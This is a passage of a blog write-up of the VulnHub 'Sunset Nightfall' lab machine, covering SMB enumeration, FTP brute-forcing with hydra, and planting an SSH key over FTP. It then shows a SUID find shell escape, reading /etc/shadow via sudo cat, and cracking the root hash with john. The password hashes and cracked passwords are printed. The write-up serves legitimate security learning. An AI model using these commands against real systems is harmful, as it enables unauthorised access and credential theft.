<p>To be honest, that&rsquo;s where the story ends for a few days. I was a little overwhelmed by the number of services (still being fairly new to the CTF scene) that could be enumerated and I found myself constantly flipping between services trying to find a way in without a steady aim or trajectory. I took some time away from Nightfall for a bit and given I knew the least about Samba and SMB, that&rsquo;s where I started my research. <a href="https://www.samba.org/samba/what_is_samba.html">The Samba website</a> states: &ldquo;Samba is the standard Windows interoperability suite of programs for Linux and Unix. Since 1992, Samba has provided secure, stable and fast file and print services for all clients using the SMB/CIFS protocol, such as all versions of DOS and Windows, OS/2, Linux and many others.&rdquo;</p>
<p><a href="https://techterms.com/definition/smb">This particular definition of SMB</a> made the most sense to me: &ldquo;SMB is a network protocol used by Windows-based computers that allows systems within the same network to share files. It allows computers connected to the same network or domain to access files from other local computers as easily as if they were on the computer&rsquo;s local hard drive. Not only does SMB allow computers to share files, but it also enables computers to share printers and even serial ports from other computers within the network. For example, a computer connected to a Windows network could print a document on a printer connected to another computer on the network, as long as both machines support the SMB protocol.&rdquo;</p>
<p>After reading a few more articles and skimming several RFCs I had a basic understanding of what Samba and SMB were. Now I wanted to know how to start interacting with a Samba server. As predicted <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">IppSec</a> has a <a href="https://www.youtube.com/watch?v=jUc1J31DNdw">great walkthrough</a> of HackTheBox: Active in which they demonstrate how to use different tools to interrogate Samba/SMB.</p>
<p>Running <a href="https://tools.kali.org/information-gathering/smbmap">SMBMap</a> didn&rsquo;t return anything interesting:</p>
<pre><code>kali@kali:~$ smbmap -H 10.0.2.19
[+] Finding open SMB ports....
[+] User SMB session established on 10.0.2.19...
[+] IP: 10.0.2.19:445   Name: 10.0.2.19                                         
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.9.5-Debian
</code></pre><p>Running <a href="https://tools.kali.org/information-gathering/enum4linux">enum4linux</a> however, did return something interesting. This tool outputs a lot of information so I&rsquo;ve stripped out the noise leaving just the interesting lines:</p>
<pre><code>kali@kali:~/Documents/vulnhub/nightfall$ enum4linux -a 10.0.2.19
...
...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\nightfall (Local User)
S-1-22-1-1001 Unix User\matt (Local User)
...
...
</code></pre><p>I was interested in how enum4linux found these users so that I might understand a bit more on how Samba and SMB work, but within minutes I was down a rabbit hole, reading about the difference between RIDs and a SIDs in Active Directory and RID cycling attacks using null sessions. Given that I had a username to start enumerating the other services with and my knowledge of Windows is minimal, I didn&rsquo;t fancy losing my mind with the exact details at this point so I left the <em>fascinating</em> world of Samba/Windows/Active Directory/SID/RID for now, with a todo on my list to spend more time understanding this technology soon.</p>
<p>I tried to FTP in as <code>matt</code> and I was prompted for a password. I recalled seeing an <code>ftp</code> mode for hydra so I looked into it, found the argument and gave it a go:</p>
<pre><code>kali@kali:~/Documents/vulnhub/nightfall$ hydra -l matt -P /usr/share/wordlists/rockyou.txt -vV 10.0.2.19 ftp -f
...
[ATTEMPT] target 10.0.2.19 - login &quot;matt&quot; - pass &quot;123456&quot; - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.0.2.19 - login &quot;matt&quot; - pass &quot;12345&quot; - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.0.2.19 - login &quot;matt&quot; - pass &quot;123456789&quot; - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.0.2.19 - login &quot;matt&quot; - pass &quot;password&quot; - 4 of 14344399 [child 3] (0/0)
...
</code></pre><p>After around 30 seconds a password was found:</p>
<pre><code>...
[ATTEMPT] target 10.0.2.19 - login &quot;matt&quot; - pass &quot;cheese&quot; - 154 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.0.2.19 - login &quot;matt&quot; - pass &quot;159753&quot; - 155 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.0.2.19 - login &quot;matt&quot; - pass &quot;arsenal&quot; - 156 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.0.2.19 - login &quot;matt&quot; - pass &quot;dolphin&quot; - 157 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.0.2.19 - login &quot;matt&quot; - pass &quot;antonio&quot; - 158 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.0.2.19 - login &quot;matt&quot; - pass &quot;heather&quot; - 159 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.0.2.19 - login &quot;matt&quot; - pass &quot;david&quot; - 160 of 14344399 [child 15] (0/0)
[21][ftp] host: 10.0.2.19   login: matt   password: cheese
[STATUS] attack finished for 10.0.2.19 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-02-15 10:36:46
</code></pre><p>I logged into the FTP server as <code>matt</code>, using the password <code>cheese</code>, and started looking around:</p>
<pre><code>kali@kali:~/Documents/vulnhub/nightfall$ ftp 10.0.2.19
Connected to 10.0.2.19.
220 pyftpdlib 1.5.5 ready.
Name (10.0.2.19:kali): matt
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
200 Active data connection established.
125 Data connection already open. Transfer starting.
-rw-------   1 matt     matt            0 Aug 28 22:41 .bash_history
-rw-r--r--   1 matt     matt          220 Aug 26 00:34 .bash_logout
-rw-r--r--   1 matt     matt         3526 Aug 26 00:34 .bashrc
drwx------   3 matt     matt         4096 Aug 28 21:26 .gnupg
drwxr-xr-x   3 matt     matt         4096 Aug 26 00:42 .local
-rw-r--r--   1 matt     matt          807 Aug 26 00:34 .profile
-rw-------   1 matt     matt            0 Aug 28 22:41 .sh_history
226 Transfer complete.
ftp&gt; 
</code></pre><p>The first thing I noticed was the <code>.gnupg</code> directory but unfortunately I didn&rsquo;t find anything exciting in it. Changing directories outside of <code>matt</code>&rsquo;s home directory wasn&rsquo;t permitted. I was stuck in the home directory <em>but</em> I had read/write permissions. I also knew the box had SSH access so the plan was to exploit that.</p>
<pre><code>kali@kali:~/Documents/vulnhub/nightfall$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/Documents/vulnhub/nightfall/ssh
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/Documents/vulnhub/nightfall/ssh.
Your public key has been saved in /home/kali/Documents/vulnhub/nightfall/ssh.pub.
kali@kali:~/Documents/vulnhub/nightfall$ cp ssh.pub authorized_keys
</code></pre><p>I created a passwordless keypair on my machine. Once I had the authorized_keys file created (which was just a copy of the ssh public key) I created a <code>.ssh</code> directory in <code>matt</code>&rsquo;s home directory and uploaded the authorized_keys file:</p>
<pre><code>ftp&gt; mkdir .ssh
257 &quot;/.ssh&quot; directory created. 
ftp&gt; cd .ssh
250 &quot;/.ssh&quot; is the current directory.
ftp&gt; put authorized_keys
local: authorized_keys remote: authorized_keys
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
563 bytes sent in 0.00 secs (204.6927 kB/s)
</code></pre><p>I opened up a new terminal and ssh&rsquo;d in as <code>matt</code>, using the private key as the identity file:</p>
<pre><code>kali@kali:~/Documents/vulnhub/nightfall$ ssh matt@10.0.2.19 -i ssh
Linux nightfall 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

...
...
matt@nightfall:~$ 
</code></pre><p>Once I was logged in as <code>matt</code> I downloaded a copy of <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">LinEnum.sh</a> from my machine (10.0.2.15) and ran it as <code>matt</code>:</p>
<pre><code>matt@nightfall:~$ wget http://10.0.2.15:8000/LinEnum.sh
...
...
2020-02-15 10:49:45 (23.4 MB/s) - ‚ÄòLinEnum.sh‚Äô saved [46631/46631]
</code></pre><p>Again, like <code>enum4linux</code>, LinEnum outputs a lot of information, but the interesting bit in all of the noise was here:</p>
<pre><code>matt@nightfall:~$ ./LinEnum.sh
...
...
[+] Possibly interesting SUID files:
-rwsr-sr-x 1 nightfall nightfall 315904 Aug 28 14:31 /scripts/find
...
...
</code></pre><p>This copy of <code>find</code> runs as user <code>nightfall</code> due to the SUID permission on the file. <code>find</code> can execute shell commands (using the <code>-exec</code> flag) and <a href="https://gtfobins.github.io/gtfobins/find/">GTFOBins</a> documents a nice one-liner to get a shell via find.</p>
<pre><code>matt@nightfall:~$ cd /scripts
matt@nightfall:/scripts$ ./find . -exec /bin/sh -p \; -quit
$ whoami
nightfall
$ cd /home/nightfall
$ ls
user.txt
$ cat user.txt
97fb7140ca325ed96f67be3c9e30083d
</code></pre><p>The first flag was found. To get around having to pivot through <code>matt</code> to user <code>nightfall</code> (and to also get a better shell) I decided to set up ssh the same way I did for <code>matt</code>:</p>
<pre><code>$ mkdir .ssh
$ cd .ssh
$ cp /home/matt/.ssh/authorized_keys authorized_keys
</code></pre><p>Once the authorized_keys were in place I could ssh in as <code>nightfall</code>.</p>
<pre><code>kali@kali:~/Documents/vulnhub/nightfall$ ssh nightfall@10.0.2.19 -i ssh
Linux nightfall 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

...
...
nightfall@nightfall:~$ 
</code></pre><p>Running LinEnum again (this time as <code>nightfall</code>) flagged something interesting:</p>
<pre><code>nightfall@nightfall:~$ /home/matt/./LinEnum.sh
...
(root) NOPASSWD: /usr/bin/cat
...
</code></pre><p>&ldquo;Wait, does this mean I can run <code>sudo cat</code> as <code>root</code> without a password?&rdquo; I thought. Yes:</p>
<pre><code>nightfall@nightfall:~$ sudo cat /etc/shadow
root:$6$JNHsN5GY.jc9CiTg$MjYL9NyNc4GcYS2zNO6PzQNHY2BE/YODBUuqsrpIlpS9LK3xQ6coZs6lonzURBJUDjCRegMHSF5JwCMG1az8k.:18134:0:99999:7:::
daemon:*:18126:0:99999:7:::
bin:*:18126:0:99999:7:::
sys:*:18126:0:99999:7:::
sync:*:18126:0:99999:7:::
games:*:18126:0:99999:7:::
man:*:18126:0:99999:7:::
lp:*:18126:0:99999:7:::
mail:*:18126:0:99999:7:::
news:*:18126:0:99999:7:::
uucp:*:18126:0:99999:7:::
proxy:*:18126:0:99999:7:::
www-data:*:18126:0:99999:7:::
backup:*:18126:0:99999:7:::
list:*:18126:0:99999:7:::
irc:*:18126:0:99999:7:::
gnats:*:18126:0:99999:7:::
nobody:*:18126:0:99999:7:::
_apt:*:18126:0:99999:7:::
systemd-timesync:*:18126:0:99999:7:::
systemd-network:*:18126:0:99999:7:::
systemd-resolve:*:18126:0:99999:7:::
messagebus:*:18126:0:99999:7:::
avahi-autoipd:*:18126:0:99999:7:::
avahi:*:18126:0:99999:7:::
saned:*:18126:0:99999:7:::
colord:*:18126:0:99999:7:::
hplip:*:18126:0:99999:7:::
nightfall:$6$u9n0NMGDN2h3/Npy$y/PVdaqMcdobHf4ZPvbrHNFMwMkPWwamWuKGxn2wqJygEC09UNJNb10X0HBK15Hs4ZwyFtdwixyyfu2QEC1U4/:18134:0:99999:7:::
systemd-coredump:!!:18126::::::
sshd:*:18126:0:99999:7:::
mysql:!:18126:0:99999:7:::
matt:$6$2u38Z1fOk8zIC5kO$oSfp/Ic0Uhb9225EdHB63ugob.B58mPuJJ8YpMB9hNaZAoJk9n3rhs9DHobzmsB20E5Yxjqsnn1x.QGKeAmiR1:18134:0:99999:7:::
</code></pre><p>I copied the entry in /etc/shadow for the <code>root</code> user into a text file (<code>root_shadow.txt</code>) and used john the ripper to crack the password:</p>
<pre><code>kali@kali:~/Documents/vulnhub/nightfall$ sudo john root_shadow.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
miguel2          (root)
1g 0:00:00:09 DONE 2/3 (2020-02-15 11:53) 0.1091g/s 3564p/s 3564c/s 3564C/s miguel2..jesucristo2
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
kali@kali:~/Documents/vulnhub/nightfall$ 
</code></pre><p>The final step was to switch to the <code>root</code> user, using the cracked password <code>miguel2</code>:</p>
<pre><code>nightfall@nightfall:~$ su -
Password: 
root@nightfall:~# ls
root_super_secret_flag.txt
root@nightfall:~# cat root_super_secret_flag.txt 
Congratulations! Please contact me via twitter and give me some feedback! @whitecr0w1
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Thank you for playing! - Felipe Winsnes (whitecr0wz)                                 flag{9a5b21fc6719fe33004d66b703d70a39}
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
root@nightfall:~# 
</code></pre><h3 id="final-thoughts">Final thoughts<a hidden class="anchor" aria-hidden="true" href="#final-thoughts">#</a></h3>
<p>This was the first time I&rsquo;d come face to face with Samba and SMB. I have a lot to learn about Windows (ugh) and some of the common services found running on Windows (ugh) but I&rsquo;m happy the gaps in my knowledge didn&rsquo;t stop me from completing this box. Nightfall was an interesting challenge that forced me to step away for a few days, do my research, and come back with a plan.</p>

</div>
  <footer class="post-footer">
<nav class="paginav">
  <a class="prev" href="/posts/vulnhub-happycorp/">
    <span class="title">¬´ Prev Page</span>
    <br>
    <span>VulnHub: HappyCorp</span>
  </a>
  <a class="next" href="/posts/my-first-writeup/">
    <span class="title">Next Page ¬ª</span>
    <br>
    <span>VulnHub: SP Eric</span>
  </a>
</nav>
<div class="share-buttons">
    <a target="_blank" rel="noopener noreferrer" aria-label="share VulnHub: Sunset Nightfall on twitter"
        href="https://twitter.com/intent/tweet/?text=VulnHub%3a%20Sunset%20Nightfall&amp;url=%2fposts%2fvulnhub-sunset-nightfall%2f&amp;hashtags=">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share VulnHub: Sunset Nightfall on linkedin"
        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=%2fposts%2fvulnhub-sunset-nightfall%2f&amp;title=VulnHub%3a%20Sunset%20Nightfall&amp;summary=VulnHub%3a%20Sunset%20Nightfall&amp;source=%2fposts%2fvulnhub-sunset-nightfall%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share VulnHub: Sunset Nightfall on reddit"
        href="https://reddit.com/submit?url=%2fposts%2fvulnhub-sunset-nightfall%2f&title=VulnHub%3a%20Sunset%20Nightfall">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share VulnHub: Sunset Nightfall on facebook"
        href="https://facebook.com/sharer/sharer.php?u=%2fposts%2fvulnhub-sunset-nightfall%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share VulnHub: Sunset Nightfall on whatsapp"
        href="https://api.whatsapp.com/send?text=VulnHub%3a%20Sunset%20Nightfall%20-%20%2fposts%2fvulnhub-sunset-nightfall%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share VulnHub: Sunset Nightfall on telegram"
        href="https://telegram.me/share/url?text=VulnHub%3a%20Sunset%20Nightfall&amp;url=%2fposts%2fvulnhub-sunset-nightfall%2f">
        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28">
            <path
                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
        </svg>
    </a>
</div>

  </footer>
</article>
    </main>
    <footer class="footer">
    <span>&copy; 2021 <a href="/">PaperMod</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)">
    <button class="top-link" id="top-link" type="button" accesskey="g">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
            <path d="M12 6H0l6-6z" />
        </svg>
    </button>
</a>

<script>
    let menu = document.getElementById('menu')
    menu.scrollLeft = localStorage.getItem("menu-scroll-position");
    menu.onscroll = function () {
        localStorage.setItem("menu-scroll-position", menu.scrollLeft);
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerText = 'copy';

        function copyingDone() {
            copybutton.innerText = 'copied!';
            setTimeout(() => {
                copybutton.innerText = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
